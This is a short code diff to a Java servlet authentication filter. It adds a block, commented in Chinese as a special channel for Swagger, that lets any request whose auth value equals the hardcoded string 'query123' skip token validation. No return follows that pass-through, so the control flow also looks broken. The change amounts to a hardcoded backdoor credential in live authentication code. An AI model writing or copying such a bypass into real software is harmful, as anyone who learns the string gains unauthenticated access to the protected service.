@@ -47,6 +47,10 @@ public class HttpBasicAuthFilter implements Filter {
             }*/
             chain.doFilter(servletRequest, servletResponse);
         } else {
+            /**swagger 特别通道*/
+            if("query123".equals(auth)){
+                chain.doFilter(servletRequest, servletResponse);
+            }
             //验证token
             if(StringUtils.isEmpty(auth)){
                 PrintWriter writer = httpResponse.getWriter();
